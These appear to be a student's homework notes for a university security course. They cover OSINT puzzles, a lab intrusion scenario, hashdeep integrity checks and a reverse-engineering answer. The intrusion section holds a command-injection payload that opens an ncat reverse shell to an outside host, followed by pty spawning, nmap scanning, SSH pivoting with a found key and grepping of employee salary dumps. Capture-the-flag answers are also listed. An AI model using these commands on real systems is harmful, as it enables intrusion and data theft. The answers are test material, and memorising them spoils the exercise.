# hw5

## pointer

search the movie in Wiki, in view history, check resent edit

```html
In reviews, over 560 people think it's tinyurl dot com slash howie5
```

check this

```html
tinyurl.com/howie5
```

go to google photos, click on one photo, then check info of it, it will tell you location

```html
https://people.duke.edu/~tkb13/courses/ece560/go/sleepy.kept.photos
```

## Question 1: Full intrusion scenario

reversed shell, on linux server, netcat listen

```sh
netcat -l -p 6666
```

on web, input

```sh
;ncat vcm-16036.vm.duke.edu 6666 -e /bin/sh
```

then your linux will connect to web server

```sh
nmap 192.168.1.80/24
python3 -c 'import pty;pty.spawn("/bin/bash");'
ssh -i /home/ubuntu/.victimco.pem ubuntu@192.168.1.97

cd /usr/share/backup/employees-db
less load_employees.dump | grep Reginald
less load_salaries1.dump | grep 10590
```

extra credits

```sh
Golden ticket #1: TRUSTICO'S SHAMEFUL SECRET
Golden ticket #2: GOLDEN DOT DAT
Golden ticket #3: WELCOME TO WEB SERVER
Golden ticket #4: WELCOME TO ACCOUNTING
```

## Question 2: Endpoint security

```html
https://people.duke.edu/~tkb13/courses/ece560/go/10590-65536.html
```

## hashdeep

```sh
sudo hashdeep /var/log/ -r > before
sudo hashdeep -r -a -vv -k before /var/log
```

## 10 Reverse Engineering

```sh
__frame_friend_init_jumbo_plaza
```

i use cutter, check out the string section
